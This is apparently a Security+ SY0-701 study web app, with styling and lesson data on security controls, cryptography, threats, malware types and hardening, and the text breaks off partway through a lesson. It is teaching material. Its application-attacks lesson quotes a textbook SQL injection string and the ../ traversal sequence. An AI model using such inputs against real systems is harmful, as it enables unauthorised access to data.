<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security+ SY0-701 Training Platform v8.8</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.23.5/babel.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#09090b;color:#fafafa;min-height:100vh}
.container{max-width:1200px;margin:0 auto;padding:20px}
.header{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid #27272a;margin-bottom:24px;flex-wrap:wrap;gap:12px}
.header h1{font-size:1.5rem}
.nav-btn{background:#27272a;border:none;color:#fafafa;padding:8px 16px;border-radius:6px;cursor:pointer;margin:4px}
.nav-btn:hover{background:#3f3f46}
.nav-btn.active{background:#6366f1}
.card{background:#18181b;border-radius:12px;padding:20px;margin-bottom:16px;border:1px solid #27272a}
.card:hover{border-color:#3f3f46}
.card h3{margin-bottom:8px}
.card p{color:#a1a1aa;font-size:0.9rem}
.domain-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px}
.badge{display:inline-block;padding:4px 8px;border-radius:4px;font-size:0.75rem;margin-right:8px}
.btn{padding:10px 20px;border-radius:8px;border:none;cursor:pointer;font-weight:500;transition:all 0.2s}
.btn-primary{background:#6366f1;color:white}
.btn-primary:hover{background:#4f46e5}
.btn-secondary{background:#27272a;color:#fafafa}
.btn-secondary:hover{background:#3f3f46}
.btn-success{background:#10b981;color:white}
.btn-success:hover{background:#059669}
.btn-warning{background:#f59e0b;color:black}
.btn-warning:hover{background:#d97706}
.btn-danger{background:#ef4444;color:white}
.btn-danger:hover{background:#dc2626}
.btn:disabled{opacity:0.5;cursor:not-allowed}
.tab-container{display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap}
.tab{padding:8px 16px;background:#27272a;border:none;color:#a1a1aa;border-radius:6px;cursor:pointer}
.tab.active{background:#6366f1;color:white}
.question-card{background:#18181b;padding:24px;border-radius:12px;margin-bottom:16px}
.option{display:block;padding:12px 16px;background:#27272a;border:2px solid #27272a;border-radius:8px;margin:8px 0;cursor:pointer;transition:all 0.2s}
.option:hover{border-color:#6366f1}
.option.selected{border-color:#6366f1;background:#1e1b4b}
.option.correct{border-color:#10b981;background:#064e3b}
.option.incorrect{border-color:#ef4444;background:#450a0a}
.feedback{padding:16px;border-radius:8px;margin-top:16px}
.feedback.correct{background:#064e3b;border:1px solid #10b981}
.feedback.incorrect{background:#450a0a;border:1px solid #ef4444}
.timer{font-size:1.5rem;font-weight:bold;color:#6366f1}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:#27272a;padding:16px;border-radius:8px;text-align:center}
.stat-value{font-size:2rem;font-weight:bold}
.stat-label{color:#a1a1aa;font-size:0.85rem}
.lesson-content{line-height:1.7}
.lesson-section{background:#27272a;padding:16px;border-radius:8px;margin:12px 0}
.key-point{background:#1e1b4b;padding:12px;border-left:3px solid #6366f1;margin:8px 0;border-radius:0 8px 8px 0}
.exam-tip{background:#422006;padding:12px;border-left:3px solid #f59e0b;margin:8px 0;border-radius:0 8px 8px 0}
.sim-intro{background:#27272a;padding:20px;border-radius:8px;margin-bottom:20px}
.dp-option{display:block;padding:16px;background:#27272a;border:2px solid #27272a;border-radius:8px;margin:10px 0;cursor:pointer}
.dp-option:hover{border-color:#6366f1}
.dp-option.selected{border-color:#6366f1}
.score-display{font-size:3rem;font-weight:bold;text-align:center;margin:20px 0}
.domain-1{color:#6366f1}.bg-domain-1{background:#6366f1}
.domain-2{color:#f59e0b}.bg-domain-2{background:#f59e0b}
.domain-3{color:#10b981}.bg-domain-3{background:#10b981}
.domain-4{color:#8b5cf6}.bg-domain-4{background:#8b5cf6}
.domain-5{color:#ec4899}.bg-domain-5{background:#ec4899}
.list-item{padding:12px 16px;background:#27272a;border-radius:8px;margin:8px 0;cursor:pointer;display:flex;justify-content:space-between;align-items:center}
.list-item:hover{background:#3f3f46}
.search-input{width:100%;padding:12px 16px;background:#27272a;border:1px solid #3f3f46;border-radius:8px;color:#fafafa;font-size:1rem;margin-bottom:16px}
.search-input:focus{outline:none;border-color:#6366f1}
.gap-bar{height:24px;background:#27272a;border-radius:4px;overflow:hidden;margin:8px 0}
.gap-fill{height:100%;border-radius:4px;transition:width 0.5s}
.remediation-card{background:#1e1b4b;border:1px solid #6366f1;border-radius:12px;padding:20px;margin:16px 0}
.pbq-zone{min-height:80px;background:#27272a;border:2px dashed #3f3f46;border-radius:8px;padding:12px;margin:8px 0}
.pbq-zone.active{border-color:#6366f1;background:#1e1b4b}
.pbq-item{display:inline-block;padding:8px 16px;background:#3f3f46;border-radius:6px;margin:4px;cursor:grab;user-select:none}
.pbq-item:hover{background:#52525b}
.pbq-item.placed{background:#6366f1}
.pbq-item.correct{background:#10b981}
.pbq-item.incorrect{background:#ef4444}
.match-line{display:flex;align-items:center;margin:8px 0;gap:12px}
.match-left{flex:1;padding:12px;background:#27272a;border-radius:8px}
.match-right{flex:1;padding:12px;background:#27272a;border-radius:8px;cursor:pointer;border:2px solid transparent}
.match-right:hover{border-color:#6366f1}
.match-right.selected{border-color:#6366f1;background:#1e1b4b}
.match-right.correct{border-color:#10b981;background:#064e3b}
.match-right.incorrect{border-color:#ef4444;background:#450a0a}
.order-item{display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:8px;margin:8px 0;cursor:grab}
.order-item:hover{background:#3f3f46}
.order-num{width:32px;height:32px;background:#3f3f46;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-right:12px;font-weight:bold}
.flashcard{perspective:1000px;width:100%;max-width:500px;height:300px;margin:20px auto;cursor:pointer}
.flashcard-inner{position:relative;width:100%;height:100%;transition:transform 0.6s;transform-style:preserve-3d}
.flashcard.flipped .flashcard-inner{transform:rotateY(180deg)}
.flashcard-front,.flashcard-back{position:absolute;width:100%;height:100%;backface-visibility:hidden;border-radius:16px;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:24px;text-align:center}
.flashcard-front{background:linear-gradient(135deg,#1e1b4b 0%,#312e81 100%);border:2px solid #6366f1}
.flashcard-back{background:linear-gradient(135deg,#064e3b 0%,#065f46 100%);border:2px solid #10b981;transform:rotateY(180deg)}
.flashcard-term{font-size:1.8rem;font-weight:bold;margin-bottom:16px}
.flashcard-hint{font-size:0.9rem;color:#a1a1aa}
.flashcard-def{font-size:1.2rem;line-height:1.6}
.flashcard-controls{display:flex;justify-content:center;gap:12px;margin-top:20px}
.wrong-answer-item{background:#27272a;border-radius:8px;padding:16px;margin:12px 0;border-left:3px solid #ef4444}
@media(max-width:640px){.header{flex-direction:column}.header h1{font-size:1.2rem}.flashcard{height:250px}}
</style>
</head>
<body>
<div id="root"></div>
<script>
const LESSON_DATA = [{"id": "D1-LESSON-001", "domain": 1, "title": "Security Controls Fundamentals", "objectives": ["1.1"], "difficulty": "beginner", "sections": [{"title": "Control Categories: The Four Pillars", "content": "Security controls are categorized by HOW they are implemented.\n\n**Technical Controls (Logical Controls)**\nImplemented through technology: firewalls, encryption, antivirus, IDS/IPS, ACLs, MFA, DLP.\n\n**Managerial Controls (Administrative)**\nPolicies and guidelines from management: security policies, risk assessments, training programs, background checks, incident response plans.\n\n**Operational Controls**\nDay-to-day procedures performed by people: security patrols, log review, patch management, backup procedures.\n\n**Physical Controls**\nProtect the physical environment: fences, locks, cameras, badge readers, mantraps, environmental controls."}, {"title": "Control Types: Function and Purpose", "content": "**Preventive Controls** - Stop incidents before they occur: firewalls, encryption, access controls, input validation.\n\n**Detective Controls** - Identify incidents during/after: IDS, cameras, audit logs, SIEM, file integrity monitoring.\n\n**Corrective Controls** - Remediate after detection: antivirus quarantine, backup restoration, patch management.\n\n**Deterrent Controls** - Discourage attacks: warning signs, login banners, visible cameras, security guard presence.\n\n**Compensating Controls** - Alternatives when primary controls aren't feasible. NOT inferior - legitimate alternatives.\n\n**Directive Controls** - Specify required behaviors: policies, procedures, warning banners."}, {"title": "Defense in Depth", "content": "Multiple layers of security so failure of one doesn't mean total compromise.\n\n**Key Principles:**\n- Layered defense (perimeter, network, host, application, data)\n- No single point of failure\n- Redundant controls\n- Different control types at each layer\n\n**Example:** Data protected by: firewall (perimeter) + IDS (network) + antivirus (host) + input validation (application) + encryption (data)."}], "keyTakeaways": ["Technical, Managerial, Operational, Physical = categories by implementation", "Preventive, Detective, Corrective, Deterrent, Compensating, Directive = types by function", "Defense in depth = multiple overlapping layers", "Compensating controls are alternatives, NOT inferior"], "examTips": ["IDS is DETECTIVE (alerts only), IPS is PREVENTIVE (blocks)", "Compensating controls provide equivalent protection when primary isn't feasible", "Know the difference between categories (how) and types (what they do)"]}, {"id": "D1-LESSON-002", "domain": 1, "title": "CIA Triad Fundamentals", "objectives": ["1.2"], "difficulty": "beginner", "sections": [{"title": "Confidentiality", "content": "Ensuring information is accessible only to authorized parties.\n\n**Controls:** Encryption (data at rest/transit), access controls, data classification, DLP, need-to-know principle.\n\n**Threats:** Data breaches, unauthorized access, social engineering, shoulder surfing."}, {"title": "Integrity", "content": "Ensuring data hasn't been modified without authorization.\n\n**Controls:** Hashing (SHA-256), digital signatures, checksums, version control, input validation.\n\n**Threats:** Data tampering, MITM attacks, SQL injection, unauthorized modifications."}, {"title": "Availability", "content": "Ensuring systems and data are accessible when needed.\n\n**Controls:** Redundancy, backups, load balancing, failover, disaster recovery, DDoS protection.\n\n**Threats:** DoS/DDoS attacks, hardware failures, natural disasters, ransomware."}, {"title": "AAA Framework", "content": "**Authentication** - Proving identity (something you know/have/are)\n\n**Authorization** - What you're allowed to do (permissions, ACLs)\n\n**Accounting** - Tracking what you did (logs, audit trails)"}], "keyTakeaways": ["CIA Triad: Confidentiality, Integrity, Availability", "AAA: Authentication, Authorization, Accounting", "Each element requires different controls", "Balance all three - overemphasizing one can harm others"], "examTips": ["Hashing = Integrity (not confidentiality)", "Encryption = Confidentiality", "Redundancy/Backups = Availability", "Know which threats target which CIA element"]}, {"id": "D1-LESSON-003", "domain": 1, "title": "Authentication Methods", "objectives": ["1.2"], "difficulty": "beginner", "sections": [{"title": "Authentication Factors", "content": "**Something You Know** - Passwords, PINs, security questions\n\n**Something You Have** - Smart cards, tokens, phones, keys\n\n**Something You Are** - Biometrics: fingerprint, retina, facial recognition\n\n**Somewhere You Are** - Location-based: GPS, IP geolocation\n\n**Something You Do** - Behavioral: typing patterns, gait analysis"}, {"title": "Multi-Factor Authentication", "content": "MFA requires TWO OR MORE DIFFERENT factor types.\n\n**Valid MFA:** Password (know) + Phone app (have)\n**NOT MFA:** Password + PIN (both are 'something you know')\n\n**Benefits:** Dramatically reduces account compromise risk"}, {"title": "Authentication Protocols", "content": "**Kerberos** - Ticket-based, Windows AD, single sign-on\n**RADIUS** - Centralized network authentication\n**TACACS+** - Cisco, separates AAA functions\n**LDAP** - Directory services authentication\n**SAML/OAuth/OIDC** - Federation and SSO protocols"}], "keyTakeaways": ["5 authentication factors: Know, Have, Are, Somewhere, Something you do", "MFA requires DIFFERENT factor types", "Kerberos uses tickets, RADIUS centralizes auth", "Federation enables SSO across organizations"], "examTips": ["Password + PIN is NOT MFA (both are 'know')", "Kerberos = tickets, Windows AD", "RADIUS = network devices, 802.1X", "SAML = enterprise SSO, OAuth = API authorization"]}, {"id": "D1-LESSON-004", "domain": 1, "title": "Cryptographic Fundamentals", "objectives": ["1.4"], "difficulty": "intermediate", "sections": [{"title": "Symmetric Encryption", "content": "Same key encrypts and decrypts.\n\n**AES** - Advanced Encryption Standard (128/256-bit), current standard\n**3DES** - Legacy, being phased out\n\n**Pros:** Fast, efficient for large data\n**Cons:** Key distribution problem"}, {"title": "Asymmetric Encryption", "content": "Public/private key pairs.\n\n**RSA** - Most common, key exchange, digital signatures\n**ECC** - Elliptic Curve, smaller keys, mobile-friendly\n\n**Pros:** Solves key distribution\n**Cons:** Slower than symmetric"}, {"title": "Hashing", "content": "One-way function, fixed output.\n\n**SHA-256** - Current standard for integrity\n**bcrypt/Argon2** - Password hashing (intentionally slow)\n**MD5/SHA-1** - Deprecated, vulnerable to collisions\n\n**Use cases:** Integrity verification, password storage, digital signatures"}, {"title": "PKI and Certificates", "content": "**Certificate Authority (CA)** - Issues digital certificates\n**Digital Certificate** - Binds public key to identity\n**CRL/OCSP** - Certificate revocation checking\n\n**Certificate Chain:** Root CA > Intermediate CA > End Entity"}], "keyTakeaways": ["Symmetric = same key (AES), fast but key distribution problem", "Asymmetric = key pairs (RSA/ECC), solves distribution, slower", "Hashing = one-way, integrity (SHA-256), passwords (bcrypt)", "PKI provides trust hierarchy for certificates"], "examTips": ["AES for symmetric, RSA/ECC for asymmetric", "bcrypt/Argon2 for passwords (slow is good)", "MD5/SHA-1 are deprecated", "OCSP = real-time cert checking, CRL = periodic list"]}, {"id": "D1-LESSON-005", "domain": 1, "title": "Zero Trust Architecture", "objectives": ["1.2"], "difficulty": "intermediate", "sections": [{"title": "Zero Trust Principles", "content": "**Never trust, always verify** - No implicit trust based on network location\n\n**Core Principles:**\n- Verify explicitly (authenticate every request)\n- Use least privilege access\n- Assume breach (minimize blast radius)\n\n**Shift from:** Trust but verify TO Never trust, always verify"}, {"title": "Zero Trust Components", "content": "**Identity** - Strong authentication, MFA everywhere\n**Device** - Device health verification, compliance checking\n**Network** - Microsegmentation, encrypted communications\n**Application** - Per-app access, no VPN required\n**Data** - Classification, encryption, DLP"}, {"title": "Implementation", "content": "**Control Plane** - Policy decision point, identity provider\n**Data Plane** - Policy enforcement points\n\n**Technologies:** SDP (Software-Defined Perimeter), SASE, Identity-aware proxies"}], "keyTakeaways": ["Never trust, always verify - even internal traffic", "Verify identity, device, and context for every request", "Microsegmentation limits lateral movement", "Assume breach - minimize blast radius"], "examTips": ["Zero Trust = no implicit trust from location", "Control plane decides, data plane enforces", "SDP/SASE are Zero Trust technologies", "Least privilege is core Zero Trust principle"]}, {"id": "D1-LESSON-006", "domain": 1, "title": "Physical Security Controls", "objectives": ["1.1"], "difficulty": "beginner", "sections": [{"title": "Perimeter Security", "content": "**Fencing** - Height matters (8ft+ for high security)\n**Bollards** - Vehicle barriers\n**Lighting** - Deterrent, CCTV effectiveness\n**Guards** - Human judgment, response capability"}, {"title": "Access Control", "content": "**Mantraps/Airlocks** - Interlocking doors prevent tailgating\n**Badge Readers** - Proximity, smart cards\n**Biometrics** - Fingerprint, retina, facial\n**Visitor Management** - Escorts, temporary badges"}, {"title": "Environmental Controls", "content": "**HVAC** - Temperature, humidity control\n**Fire Suppression** - FM-200 (clean agent), water (not for electronics)\n**UPS/Generators** - Power continuity\n**Hot/Cold Aisles** - Data center cooling efficiency"}], "keyTakeaways": ["Mantraps prevent tailgating with interlocking doors", "FM-200 is clean agent fire suppression (safe for electronics)", "Environmental controls protect against non-malicious threats", "Layered physical security mirrors defense in depth"], "examTips": ["Mantrap = interlocking doors, one opens other locked", "FM-200 = safe for electronics, water is NOT", "Bollards = vehicle barriers", "Know hot/cold aisle concepts for data centers"]}, {"id": "D1-LESSON-007", "domain": 1, "title": "Deception Technologies", "objectives": ["1.1"], "difficulty": "intermediate", "sections": [{"title": "Honeypots and Honeynets", "content": "**Honeypot** - Decoy system to attract attackers\n**Honeynet** - Network of honeypots\n\n**Purpose:** Detect attackers, study techniques, divert from real assets\n**Key Point:** Any interaction is suspicious (no legitimate use)"}, {"title": "Honeytokens and Honeyfiles", "content": "**Honeytoken** - Fake credentials, API keys, data\n**Honeyfile** - Fake sensitive documents\n\n**Use:** Plant in databases, file shares, code repos\n**Alert:** Any access triggers investigation"}, {"title": "DNS Sinkholes", "content": "Redirect malicious DNS queries to controlled server.\n\n**Use cases:** Block malware C2, detect infected hosts, disrupt botnets"}], "keyTakeaways": ["Honeypots detect attackers - any interaction is suspicious", "Honeytokens are fake credentials/data that trigger alerts", "DNS sinkholes redirect malicious traffic", "Deception technologies are detective controls"], "examTips": ["Honeypot = decoy system", "Honeytoken = fake credential/data", "Any honeypot interaction = suspicious", "DNS sinkhole = redirect malicious DNS"]}, {"id": "D1-LESSON-008", "domain": 1, "title": "Change Management", "objectives": ["1.3"], "difficulty": "beginner", "sections": [{"title": "Change Management Process", "content": "**Request** - Document proposed change\n**Review** - CAB (Change Advisory Board) evaluation\n**Approve/Deny** - Risk-based decision\n**Implement** - Scheduled execution\n**Verify** - Confirm success\n**Document** - Update records"}, {"title": "Change Types", "content": "**Standard** - Pre-approved, low risk, routine\n**Normal** - Requires CAB review\n**Emergency** - Urgent, expedited approval\n\n**Key:** Even emergencies need documentation (after the fact if necessary)"}, {"title": "Rollback and Testing", "content": "**Rollback Plan** - How to reverse if change fails\n**Testing** - Validate in non-production first\n**Maintenance Windows** - Scheduled change periods\n**Version Control** - Track all changes to configurations/code"}], "keyTakeaways": ["CAB reviews and approves changes", "All changes need documentation, including emergencies", "Rollback plans are essential", "Test changes before production deployment"], "examTips": ["CAB = Change Advisory Board", "Emergency changes still need documentation", "Version control tracks configuration changes", "Maintenance windows minimize user impact"]}, {"id": "D2-LESSON-001", "domain": 2, "title": "Threat Actors and Motivations", "objectives": ["2.1"], "difficulty": "beginner", "sections": [{"title": "Threat Actor Types", "content": "**Nation-State** - Government-sponsored, highly sophisticated, persistent. Motivations: espionage, sabotage, influence operations. Examples: APT groups.\n\n**Organized Crime** - Financial motivation, ransomware, fraud, data theft. Professional operations, business-like structure.\n\n**Hacktivists** - Ideological motivation, website defacement, data leaks, DDoS. Anonymous, political groups.\n\n**Insider Threats** - Employees, contractors with legitimate access. Intentional (malicious) or unintentional (negligent).\n\n**Script Kiddies** - Low skill, use existing tools, opportunistic."}, {"title": "Threat Actor Attributes", "content": "**Internal vs External** - Inside vs outside the organization\n**Resources/Funding** - From minimal to nation-state budgets\n**Sophistication** - Script kiddie to APT\n\n**Intent:** Espionage, Financial gain, Disruption, Reputation damage, Destruction"}, {"title": "Attack Sophistication", "content": "**APT (Advanced Persistent Threat)**\n- Sophisticated techniques\n- Long-term campaigns (months/years)\n- Specific targets\n- Usually nation-state or organized crime\n- Named groups (APT28, APT29, Lazarus)"}], "keyTakeaways": ["Nation-state = most sophisticated, espionage/sabotage", "Organized crime = financially motivated", "Insiders have legitimate access - hardest to detect", "APT = advanced, persistent, targeted attacks"], "examTips": ["APT typically = nation-state actors", "Insider threats can be intentional or unintentional", "Script kiddies are low-skill but still dangerous", "Know motivation alignment: nation-state=espionage, crime=money"]}, {"id": "D2-LESSON-002", "domain": 2, "title": "Threat Vectors and Attack Surfaces", "objectives": ["2.2"], "difficulty": "beginner", "sections": [{"title": "Common Threat Vectors", "content": "**Email** - Phishing, malicious attachments, BEC\n**Web** - Drive-by downloads, watering holes, malicious ads\n**Removable Media** - USB drops, infected devices\n**Cloud** - Misconfigured storage, compromised credentials\n**Supply Chain** - Compromised software/hardware vendors\n**Social Engineering** - Human manipulation"}, {"title": "Attack Surface", "content": "**Definition** - All points where attacker can try to enter\n\n**Components:**\n- Network services and ports\n- Web applications and APIs\n- User accounts and credentials\n- Physical access points\n- Third-party connections\n\n**Reduction:** Minimize exposed services, close unused ports, limit access"}, {"title": "Supply Chain Attacks", "content": "**Software Supply Chain** - Compromised updates, libraries, build systems\n**Hardware Supply Chain** - Tampered devices, counterfeit components\n**Service Providers** - MSP compromise affects all customers\n\n**Examples:** SolarWinds, Kaseya, NotPetya"}], "keyTakeaways": ["Email remains #1 threat vector", "Attack surface = all potential entry points", "Supply chain attacks affect many victims at once", "Reduce attack surface by minimizing exposure"], "examTips": ["Supply chain = compromise vendor to reach targets", "Attack surface reduction = key defensive strategy", "Watering hole = compromise site victims visit", "USB drops exploit human curiosity"]}, {"id": "D2-LESSON-003", "domain": 2, "title": "Social Engineering", "objectives": ["2.2"], "difficulty": "intermediate", "sections": [{"title": "Phishing Variants", "content": "**Phishing** - Mass emails, generic targeting\n**Spear Phishing** - Targeted at specific individuals/organizations\n**Whaling** - Targeting executives specifically\n**Vishing** - Voice/phone phishing\n**Smishing** - SMS text phishing\n**Business Email Compromise** - Impersonating executives for wire fraud"}, {"title": "Psychological Principles", "content": "**Authority** - Impersonating IT, executives, law enforcement\n**Urgency** - 'Act now or lose access'\n**Social Proof** - 'Everyone else is doing it'\n**Reciprocity** - Give something to get something\n**Scarcity** - Limited time offers\n**Familiarity** - Pretending to know the victim"}, {"title": "Physical Social Engineering", "content": "**Tailgating** - Following authorized person through door\n**Piggybacking** - With permission (holding door)\n**Pretexting** - Creating false scenario\n**Baiting** - Leaving infected USB drives\n**Dumpster Diving** - Searching trash for information"}], "keyTakeaways": ["Phishing = mass, Spear phishing = targeted, Whaling = executives", "Vishing = voice, Smishing = SMS", "Social engineering exploits human psychology", "Physical attacks include tailgating, pretexting, baiting"], "examTips": ["Know all phishing variants and their targets", "BEC targets finance for wire transfers", "Tailgating = unauthorized following", "Pretexting = creating false scenario/identity"]}, {"id": "D2-LESSON-004", "domain": 2, "title": "Malware Types", "objectives": ["2.4"], "difficulty": "intermediate", "sections": [{"title": "Malware Categories", "content": "**Virus** - Requires host file, user action to spread\n**Worm** - Self-replicating, no user action needed\n**Trojan** - Disguised as legitimate software\n**Ransomware** - Encrypts files, demands payment\n**Spyware** - Monitors and steals information\n**Rootkit** - Hides malware presence, kernel-level access"}, {"title": "Advanced Malware", "content": "**RAT (Remote Access Trojan)** - Provides remote control\n**Keylogger** - Records keystrokes\n**Cryptominer** - Uses resources for cryptocurrency\n**Fileless Malware** - Lives in memory, no files on disk\n**Logic Bomb** - Triggers on specific condition"}, {"title": "Malware Delivery", "content": "**Dropper** - Initial payload that downloads more malware\n**C2 (Command and Control)** - Communication with attacker\n**Persistence** - Survives reboots (registry, scheduled tasks)\n**Lateral Movement** - Spreading within network"}], "keyTakeaways": ["Virus needs user action; Worm self-propagates", "Ransomware encrypts for extortion", "Rootkits hide malware presence", "Fileless malware avoids disk-based detection"], "examTips": ["Virus = needs host file, Worm = self-replicating", "Rootkit = hides malware, modifies OS", "Logic bomb = triggers on condition (date, event)", "Know the difference between RAT and backdoor"]}, {"id": "D2-LESSON-005", "domain": 2, "title": "Network Attacks", "objectives": ["2.4"], "difficulty": "intermediate", "sections": [{"title": "Denial of Service", "content": "**DoS** - Single source overwhelming target\n**DDoS** - Distributed, multiple sources (botnets)\n\n**Types:**\n- Volumetric (bandwidth flooding)\n- Protocol (SYN flood, Smurf)\n- Application layer (HTTP flood)\n\n**Mitigations:** Rate limiting, CDN, scrubbing services"}, {"title": "Man-in-the-Middle", "content": "**MITM** - Intercepting communications\n\n**Techniques:**\n- ARP spoofing (local network)\n- DNS spoofing (redirect to fake sites)\n- SSL stripping (downgrade HTTPS)\n\n**Prevention:** Encryption, certificate validation, DNSSEC"}, {"title": "Network Reconnaissance", "content": "**Port Scanning** - Identify open services\n**Vulnerability Scanning** - Find weaknesses\n**Banner Grabbing** - Identify software versions\n**Packet Sniffing** - Capture network traffic\n\n**Tools:** Nmap, Wireshark, vulnerability scanners"}], "keyTakeaways": ["DDoS uses multiple sources (botnets)", "ARP spoofing enables MITM on local networks", "Encryption prevents most MITM attacks", "Port scanning identifies attack surface"], "examTips": ["SYN flood = incomplete TCP handshakes", "ARP spoofing = local network MITM", "DNS poisoning = redirect to malicious sites", "Amplification attacks use reflection (DNS, NTP)"]}, {"id": "D2-LESSON-006", "domain": 2, "title": "Application Attacks", "objectives": ["2.3", "2.4"], "difficulty": "intermediate", "sections": [{"title": "Injection Attacks", "content": "**SQL Injection** - Insert SQL commands via input\n- Example: ' OR '1'='1' --\n- Prevention: Parameterized queries, input validation\n\n**Command Injection** - Execute OS commands\n**LDAP Injection** - Manipulate directory queries\n**XML Injection** - Malicious XML data"}, {"title": "Web Application Attacks", "content": "**XSS (Cross-Site Scripting)** - Inject scripts into web pages\n- Stored XSS - Persists in database\n- Reflected XSS - In URL parameters\n- DOM-based - Client-side manipulation\n\n**CSRF** - Trick user's browser into making requests\n\n**Prevention:** Output encoding, CSP, CSRF tokens"}, {"title": "Other Application Attacks", "content": "**Buffer Overflow** - Exceed memory boundaries\n**Race Condition** - Timing exploitation\n**Directory Traversal** - Access files outside webroot (../)\n**API Attacks** - Broken auth, excessive data exposure"}], "keyTakeaways": ["SQLi: parameterized queries prevent it", "XSS: output encoding prevents it", "CSRF: tokens validate request origin", "Input validation is essential for all inputs"], "examTips": ["SQLi uses ' OR '1'='1 type patterns", "Stored XSS is more dangerous than reflected", "CSRF requires victim to be authenticated", "Directory traversal uses ../ sequences"]}, {"id": "D2-LESSON-007", "domain": 2, "title": "Vulnerability Management", "objectives": ["2.3"], "difficulty": "intermediate", "sections": [{"title": "Vulnerability Scanning", "content": "**Credentialed Scans** - With authentication, deeper visibility, fewer false positives\n**Non-credentialed** - External view, faster but less complete\n\n**Types:**\n- Network vulnerability scanners\n- Web application scanners\n- Configuration compliance scanners"}, {"title": "CVSS Scoring", "content": "**Common Vulnerability Scoring System**\n\n- Critical: 9.0-10.0\n- High: 7.0-8.9\n- Medium: 4.0-6.9\n- Low: 0.1-3.9\n\n**Factors:** Attack vector, complexity, privileges required, user interaction, scope, impact (CIA)"}, {"title": "Remediation Process", "content": "**Prioritization** - Critical assets, exploitability, business impact\n**Patching** - Test before production deployment\n**Compensating Controls** - When patching isn't possible\n**Exceptions** - Document and review accepted risks\n\n**Cycle:** Scan > Prioritize > Remediate > Verify > Repeat"}], "keyTakeaways": ["Credentialed scans provide deeper, more accurate results", "CVSS 9+ is Critical severity", "Prioritize by risk: exploitability + asset value", "Vulnerability management is continuous, not one-time"], "examTips": ["Credentialed = deeper scan, fewer false positives", "CVSS Critical = 9.0+, High = 7.0-8.9", "Zero-day = no patch available yet", "Compensating controls when patching isn't possible"]}, {"id": "D2-LESSON-008", "domain": 2, "title": "Indicators of Compromise", "objectives": ["2.4"], "difficulty": "intermediate", "sections": [{"title": "IOC Types", "content": "**Network IOCs**\n- Malicious IP addresses\n- Command and control domains\n- Unusual traffic patterns\n\n**Host IOCs**\n- File hashes (MD5, SHA256)\n- Registry modifications\n- Suspicious processes\n- Unusual scheduled tasks"}, {"title": "Threat Intelligence", "content": "**STIX** - Structured Threat Information eXpression (format)\n**TAXII** - Trusted Automated eXchange of Intelligence Information (transport)\n\n**Sources:** ISACs, commercial feeds, OSINT, vendor reports"}, {"title": "Detection Methods", "content": "**Signature-based** - Known patterns (fast, misses new threats)\n**Behavioral/Anomaly** - Deviation from baseline (catches unknown, more false positives)\n**Heuristic** - Rule-based analysis of characteristics"}], "keyTakeaways": ["IOCs include IPs, domains, hashes, behaviors", "STIX = format, TAXII = transport for threat intel", "Signature-based is fast but misses new threats", "Behavioral detection catches unknown threats"], "examTips": ["STIX = format for threat data", "TAXII = transport protocol for sharing", "File hashes are definitive IOCs", "Behavioral detection has more false positives"]}, {"id": "D2-LESSON-009", "domain": 2, "title": "Hardening and Configurations", "objectives": ["2.5"], "difficulty": "intermediate", "sections": [{"title": "Hardening Principles", "content": "**Least Functionality** - Install only required software, enable only needed services, remove unnecessary features.\n\n**Secure Defaults** - Change default passwords, modify default configurations, disable default accounts.\n\n**Attack Surface Reduction** - Disable unnecessary services, close unused ports, remove unused applications."}, {"title": "Hardening Standards", "content": "**CIS Benchmarks** - Free, Level 1 (basic) and Level 2 (strict)\n**DISA STIGs** - DoD Security Technical Implementation Guides\n**Vendor Guidelines** - Microsoft, Cisco, etc. security baselines\n\n**Implementation:** Golden images, configuration management, automated compliance checking"}, {"title": "OS and Application Hardening", "content": "**Windows Hardening:**\n- Disable SMBv1 (WannaCry), disable LLMNR\n- Use LAPS for local admin passwords\n- Enable Credential Guard\n\n**Linux Hardening:**\n- Disable root SSH login\n- Remove unnecessary packages\n- Configure firewall (iptables/firewalld)"}, {"title": "Network and IoT Hardening", "content": "**Network Devices:**\n- SSH instead of Telnet\n- SNMPv3 (encrypted) instead of v1/v2\n- Disable unused ports\n- Implement 802.1X\n\n**IoT Security:**\n- Change default credentials\n- Network segmentation\n- Regular firmware updates"}], "keyTakeaways": ["Hardening reduces attack surface by removing unnecessary functionality", "CIS Benchmarks = free standards, Level 1/2", "Disable SMBv1, LLMNR on Windows", "IoT must be segmented from corporate networks"], "examTips": ["CIS Benchmarks = free, Level 1 basic, Level 2 strict", "SMBv1 disabled prevents WannaCry-style attacks", "SNMPv3 has encryption, v1/v2 do not", "LAPS = Local Administrator Password Solution"]}, {"id": "D2-LESSON-010", "domain": 2, "title": "Mitigation Techniques", "objectives": ["2.5"], "difficulty": "intermediate", "sections": [{"title": "Network Mitigations", "content": "**Network Segmentation** - Divide network into security zones, limit lateral movement, contain breaches.\n\n**Methods:** VLANs, physical segmentation, microsegmentation\n\n**Egress Filtering** - Control outbound traffic, block C2 communications"}, {"title": "Application Mitigations", "content": "**WAF** - Inspect HTTP traffic, block SQLi/XSS, virtual patching\n\n**Input Validation** - Whitelist allowed input, reject malformed data\n\n**Output Encoding** - Prevent XSS by encoding special characters"}, {"title": "Endpoint Mitigations", "content": "**Memory Protection:** DEP (prevents code in data), ASLR (randomizes memory)\n\n**Application Whitelisting** - Only approved apps can run\n\n**Host-based Firewall** - Control per-endpoint traffic"}, {"title": "Compensating Controls and Deception", "content": "**Compensating Controls** - Alternatives when primary isn't feasible (must provide equivalent protection)\n\n**Deception:** Honeypots (decoy systems), Honeytokens (fake credentials), DNS sinkholes"}], "keyTakeaways": ["Segmentation limits lateral movement", "WAF provides virtual 